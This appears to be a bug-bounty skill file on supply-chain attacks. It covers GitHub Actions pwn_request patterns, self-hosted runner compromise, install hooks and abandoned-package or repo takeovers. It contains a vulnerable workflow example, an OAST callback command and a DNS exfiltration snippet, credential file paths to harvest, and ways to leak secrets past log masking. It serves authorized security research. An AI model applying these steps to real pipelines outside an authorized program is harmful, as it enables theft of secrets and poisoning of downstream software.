---
name: supply-chain
category: vulnerabilities
description: Supply-chain attacks via CI/CD token abuse, Actions pwn_request, self-hosted runner compromise, post-install hooks, and compromised maintainer accounts
depends_on: []
---

# Supply Chain

Supply-chain vulnerabilities give code execution on every system that builds, installs, or deploys the target. The highest-paid bugs are live misconfigurations allowing external contributors to reach write-access on the target's own infrastructure — not malicious packages in the wild.

NOTE: For dependency confusion specifically (public-registry hijack of internal package names), see `dependency_confusion.md`. This skill covers CI/CD supply chain, package registry attacks, maintainer compromise, and artifact integrity.

## Attack Surface

**CI/CD Pipeline Compromise**
- GitHub Actions: `pull_request_target`, `workflow_run`, `issue_comment` triggers with fork PR code execution
- Self-hosted runners on public repos: any fork PR gets RCE on target infrastructure
- Unpinned action references (`@v1` tag, not SHA): upstream author can push malicious code
- `GITHUB_TOKEN` with `contents: write`, `packages: write`, or `id-token: write`
- GitLab CI runners auto-picking up fork MRs; Bitbucket Pipelines variable contamination

**Build and Release Tooling**
- Install hooks: npm preinstall/postinstall, pip setup.py cmdclass, gem extensions, NuGet install.ps1
- Release artifact signing: cosign, GPG, sigstore, provenance attestations
- Nightly cron workflows pushing releases with long-lived tokens
- Lock file integrity: missing `sha512` hashes, `npm install` vs `npm ci` differential

**Third-Party Packages**
- Maintainer account takeover via stale email domains
- Dormant packages with `file:` or `git+https` deps pointing to dead repos
- Typosquatted package names masquerading as popular libraries
- Package metadata manipulation after initial security review

**Artifact Integrity**
- Git dependencies without commit pinning (tag mutation)
- Container images from public registries without digest verification
- SBOM/SLSA provenance gaps between claimed and actual build processes

## Package Registry Attack Matrix

| Registry | Attack | Technique | Impact |
|----------|--------|-----------|--------|
| npm | Scope hijack | Register unclaimed `@org` on npmjs.com, publish under it | RCE on every consumer's `npm install` |
| npm | Post-install hook injection | `preinstall`/`postinstall` in `package.json` scripts | Code execution at install time, pre-import |
| npm | Lockfile registry swap | Replace `resolved` URL in `package-lock.json` to attacker registry | Silent package substitution on `npm ci` |
| PyPI | setup.py cmdclass | Override `install.run()` with beacon/exfil code | RCE during `pip install`, pre-import |
| PyPI | Namespace absence | PyPI has no scoping — any name is global, first-come-first-served | Trivial name squatting for internal packages |
| RubyGems | Extension build hook | `extconf.rb` runs during gem native extension compilation | RCE during `gem install` or `bundle install` |
| RubyGems | Source priority confusion | Mixed `source` blocks in Gemfile with Bundler < 2.2.10 | Public version overrides private even with explicit source blocks ($5K Basecamp) |
| Maven | GroupId hijack | Corporate reverse-DNS groupIds occasionally bypass Maven Central verification | Substitution of internal Java packages |
| NuGet | Legacy `packages.config` hooks | `init.ps1`/`install.ps1` under `tools/` execute on legacy projects | Code execution on Windows build agents |
| Cargo | Build script abuse | `build.rs` runs at compile time with full host access | RCE during `cargo build` |
| Go | GOPROXY fallthrough | Private proxy misconfigured to fall through to `proxy.golang.org` | Module substitution via vanity-URL domain takeover |
| Docker | Tag mutation | Push new image to same tag on public registry | Silent image replacement on next `docker pull` |

## Abandoned Package Takeover

| Registry | Takeover Method | Detection | Impact |
|----------|----------------|-----------|--------|
| npm | Stale maintainer email domain — register domain, reset npm password | `npm view PKG maintainers`, WHOIS on email domain | Full package control, publish malicious update |
| npm | Dead `git+https` dependency — claim abandoned GitHub username/repo | `grep -oE '"git\+https://github.com/[^"]+' package.json` | RCE on every consumer that installs the parent |
| PyPI | Maintainer email domain expired — register and reset | `pip show PKG` for author email, WHOIS check | Publish trojanized version |
| RubyGems | Gem yanked but name reclaimable after 30 days | `gem info PKG --remote` returns 404 | Claim name, publish with install hooks |
| GitHub Actions | Repo or org renamed/deleted — old ref still in consumer workflows | `grep -rE 'uses: [^/]+/' .github/workflows/` | RCE in every workflow using the old reference |
| Cargo | Crate transfer or abandoned crate — request ownership via crates.io | `cargo owner --list PKG` shows inactive maintainer | Supply chain attack on Rust ecosystem consumers |
| Docker Hub | Abandoned namespace — Docker Hub allows org/user reclaim | `docker pull org/image` fails with 404 | Image substitution in CI/CD and production |

## GitHub Actions Supply Chain Patterns

### pwn_request: `pull_request_target` with checkout of PR HEAD

The canonical CI/CD supply-chain vuln. Look for:
```yaml
on: pull_request_target
jobs:
  x:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
      - run: npm install && npm test                       # Runs attacker code
```

**Impact escalation**: `GITHUB_TOKEN` with `contents: write` → push to main. With `id-token: write` → exchange for cloud creds via OIDC. With `packages: write` → publish backdoored package.

### Self-Hosted Runner Compromise

Self-hosted runners on public repos are near-automatic RCE ($10K Meta/PyTorch). Enumerate: `site:github.com inurl:workflows +"self-hosted"`. Persistent disk exposes cached credentials, SSH keys, kube configs, Docker logins.

### Upstream Action Poisoning

Compromise a popular reusable action via its own CI/CD misconfiguration, poison its mutable tag, cascade to all downstream consumers ($7.5K Google — Release-Drafter to Accompanist).

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| Private registry for internal packages | `--extra-index-url` falls through to public on miss (pip) | Standard dep-confusion primitive |
| `npm ci` with lockfile | Lockfile `resolved` URL points to attacker registry if lockfile tampered | Lockfile-tampering vector |
| `actions/checkout` with `persist-credentials: false` | Other steps may re-authenticate or token available via `ACTIONS_RUNTIME_TOKEN` | Cache/artifact API access |
| Bundler source blocks (pre-2.2.10) | Transitive dependencies resolved globally, not per-source | #1104874 ($5K) — Basecamp okra gem |
| `npm audit signatures` (provenance check) | Only covers packages with provenance — vast majority don't have it | Coverage gap in newer npm feature |
| SLSA L3 provenance attestation | Workflow itself is vulnerable to pwn request — provenance is real but build is poisoned | #747504640 — Google programs advertising SLSA L3 with live pwn request vulns |
| Version pinning in lockfile | Git dependency with `git+https://` to dead repo — no lockfile version | #790634 — branch name as git hash confusion |
| `npm install --ignore-scripts` | Does not protect against `bin` field hijack or `main` field code execution | Install hooks are only one execution vector |

## Chain Patterns

| Chain | Steps | Evidence |
|-------|-------|---------|
| Pwn request → cloud compromise | Fork PR triggers privileged workflow → OIDC token exfil → cloud creds via federation | #716024320 ($3.1M) — 9 GCP projects |
| Maintainer takeover → dep-confusion combo | Compromise low-profile package via stale email → publish patch with preinstall hook → next `npm update` executes hook | Standard combination of two primitives |
| Self-hosted runner → internal network | Fork PR on public repo → RCE on internal runner → pivot via cached kube/cloud/SSH creds | #582734050 ($10K) — Meta/PyTorch |
| Upstream action → downstream cascade | Dependabot confusion on upstream action → poison mutable tag → all consumers pull backdoor | #3317400079 ($7.5K) — Release-Drafter chain |
| SBOM leak → targeted dep-confusion | Published SBOM reveals exact internal dep tree → attacker claims unclaimed names at higher version | SBOM as intelligence source for dep-confusion |
| Git dep hijack → build RCE | Dead GitHub username in `git+https` dep → register username → control dependency content | Standard git dependency takeover |
| Package takeover → CI secret exfil | Trojanized package with preinstall → build server executes → `$GITHUB_TOKEN`, `$AWS_*` exfil via DNS | #1187816 — Sifnode unclaimed npm packages |
| Actions log poisoning → secret leak | Force workflow to emit `base64 $SECRET` → masking misses encoded values → secrets in public logs | Encoding-based masking bypass |

## Self-Hosted Runner Attack Pipeline

The $1.33M TensorFlow finding (#302487040) codified the canonical self-hosted runner attack workflow:

1. **Enumerate**: Scan target's public repos for `runs-on: self-hosted` or custom labels (use gato-x, or `grep -rn 'self-hosted' .github/workflows/`)
2. **Identify trigger**: Find a workflow triggered by `pull_request` or `pull_request_target` on a repo accepting external PRs
3. **Fork and weaponize**: Fork the repo, modify the workflow or test/build step to include a callback (`curl https://oast.site/$(hostname)`)
4. **Open PR**: The CI system picks up the fork PR and runs it on the self-hosted runner
5. **Persist and pivot**: Self-hosted runners retain disk state -- cached credentials (`~/.docker/config.json`, `~/.kube/config`, `~/.ssh/`, `ACTIONS_RUNTIME_TOKEN`), build artifacts, and network access to internal services
6. **Escalate**: Use cached creds for lateral movement to cloud accounts, container registries, or internal networks

**Key detail**: Unlike GitHub-hosted runners (ephemeral VMs), self-hosted runners are persistent machines. A single fork PR grants access to everything cached from prior runs.

## New-Primitive Propagation Hunting

When a new supply-chain attack technique is published (Dependabot actor confusion, OIDC token theft, pwn request variant), immediately identify the highest-value targets vulnerable to it. Methodology:

1. **Learn the primitive**: Understand the exact trigger condition (e.g., Dependabot actor confusion requires `github.actor == 'dependabot[bot]'` check with PR-triggerable workflow)
2. **Mass scan**: Use Sourcegraph/GitHub code search to find all repos matching the trigger pattern across high-value organizations
3. **Triage**: Filter by repo popularity, org bounty program, and secret scope
4. **Report**: First reporter on a new primitive gets the bounty; 48-hour window is typical before saturation ($7.5K Google/Accompanist, #3317400079)

## Namespace Defense Bypass Enumeration

For any namespace defense (typosquatting prevention, ownership retention, name-squatting blocks), enumerate EVERY operation that can change occupancy:

| Operation | Defense Bypassed | Technique |
|-----------|-----------------|-----------|
| User/org rename | Name retained for redirect | Rename A->B, rename C->A before retention expires (#78497088) |
| User/org delete | Name blocked for re-registration | Delete + re-create with timing, or use a different registrar |
| Repository transfer | Name redirect may expire | Transfer repo out of org, claim org name |
| Package unpublish | Name available for re-registration | Unpublish + immediate re-register by attacker (AWS backfill, #819480256) |
| Scope transfer | `@org` scope orphaned | Org deleted/renamed on registry, scope reclaimable |

**Package backfill attack**: When a package is unpublished/deprecated from a registry, the name becomes reclaimable. Monitor popular package removals and backfill with a beacon-only package to prove the attack surface. AWS was targeted via this exact pattern (#819480256).

## Documentation as Supply-Chain Attack Surface

Docs, ecosystem index pages, and READMEs are gold mines for supply-chain takeover:

1. **Link audit**: Every external code-source link in official docs, READMEs, package metadata, and dependency manifests. For each: does the linked repo/user still exist? Is it under the original owner?
2. **Ecosystem indexes**: "List of integrations/drivers/plugins/extensions" pages link to community repos -- check if any linked GitHub usernames are unregistered or repos are deleted (#1434967, Kubernetes CSI driver docs)
3. **Action references in docs**: Example workflow snippets in docs with `uses: user/action@ref` -- if `user` is unregistered, anyone can claim it and get RCE on every copier (#1439355, Shopify/unity-buy)
4. **Install scripts**: `curl | bash` or `pip install` URLs in docs -- verify the domain, repo, and path still resolve to the original maintainer (#1166535, Brew bootstrap)

## Pipe-to-Shell Install Integrity Testing

Any `curl | bash`, `curl | python`, or `wget | sh` install pattern is an integrity verification failure. Test: (1) Is the transport HTTPS? (2) Does the script verify checksums of downloaded binaries? (3) Can a MITM or CDN compromise serve a modified script? (4) Does the installer pin versions or pull `latest`? (#1166535)

## Testing Methodology

1. **Enumerate workflows**: `.github/workflows/*.yml` on all public repos in scope
2. **Search triggers**: `pull_request_target`, `workflow_run`, `issue_comment` via grep/Sourcegraph
3. **Map checkout refs**: which jobs checkout PR HEAD vs base?
4. **Inspect permissions**: top-level and per-job `permissions:` keys; missing block = full default token
5. **Self-hosted runners**: `runs-on: self-hosted` or custom labels on public repos
6. **Unpinned actions**: `@main`, `@master`, `@v[0-9]+` vs pinned SHAs
7. **Secret log leaks**: `echo $TOKEN`, `set-output`, `set-env` in build steps
8. **Lockfile audit**: integrity hashes, registry URLs, git deps with hijackable usernames
9. **Package audit**: install scripts, obfuscation, recently-published changes, maintainer email domains

## Validation

1. Concrete workflow file path and line with vulnerable trigger/checkout combination
2. Fork repo, open benign PR with OAST callback in install/test step
3. Proof callback fired from CI infra (GitHub Actions IP range, user agent, timing)
4. List secrets accessible to the job (names only, not values)
5. Impact narrative: what would a real attacker do with this token?

## False Positives

- `pull_request` (not `_target`) — runs in fork context with no secrets
- `pull_request_target` but no PR checkout, or checkout of base ref only
- `permissions: read-all` or explicitly empty — no write scopes
- Self-hosted runner with org-check gate AND ephemeral lifecycle
- Package with install scripts that run only during maintainer's own publish
- `npm ci` with lockfile containing valid integrity hashes from correct registry

## Pro Tips

1. Live CI/CD misconfigurations pay 10-100x more than malicious package reports — prioritize pipeline bugs over package hunting
2. `pull_request_target` with PR checkout is the canonical finding, but indirect injection through step outputs (multi-hop data flow) survives years undetected in top programs
3. Gato-X-style scale scanning: 20K repos via Sourcegraph → filter by triggers → human triage at ~70% FP rate → high-yield findings
4. Auto-label bots create phantom security gates — always verify what triggers label application
5. Dependabot actor confusion bypasses `github.actor == 'dependabot[bot]'` — current-generation primitive
6. Two-hop supply chain (compromise upstream action → poison tag → cascade) has exponential blast radius — look for popular actions with their own CI/CD misconfigs
7. SLSA/SBOM framing pays — triagers value maturity-model language. "Advertises SLSA L3 but has live pwn request" is compelling
8. DNS exfil (`dns.resolve(hostname + '.oast.site')`) works when HTTP egress is blocked — standard for CI environments
9. Never exfil actual secrets. Show token prefix exists, offer immediate PR deletion, include one-line fix in report
10. `persist-credentials: true` is the default in `actions/checkout` — even without env var access, token leaks to `.git/config`
11. Self-hosted runners on public repos are the single highest-paying supply-chain primitive — $1.33M on TensorFlow (#302487040), $10K on Meta/PyTorch (#582734050). Enumerate with `site:github.com inurl:workflows +"self-hosted"` or gato-x
12. When a new attack primitive drops (Dependabot confusion, OIDC abuse), you have a 48-hour first-reporter window before saturation — immediately mass-scan the top 100 bounty programs for the trigger pattern ($7.5K Google, #3317400079)
13. Audit unpublished/deprecated packages in target org registries — the name may be reclaimable for a backfill attack. Monitor npm/PyPI removal feeds for high-value org packages (AWS targeted, #819480256)
14. Docs pages with "list of community integrations/plugins" are repo-jacking goldmines — check every linked GitHub username for availability. Kubernetes CSI driver docs had a takeover via unregistered doc link (#1434967)
15. For EVERY `uses:` reference in GitHub workflows, check if the username portion is currently registered. Unregistered usernames = free RCE on every workflow run (Shopify #1439355)

## Summary

Supply-chain bugs pay because a single finding compromises every downstream consumer. Focus on live CI/CD misconfigurations — `pull_request_target` with PR checkout, self-hosted runners on public repos, unpinned write-scoped actions — before hunting for malicious packages. Prove code execution on the target's infra with a benign OAST callback, document the secrets and scopes accessible, and close the loop with a one-line fix.
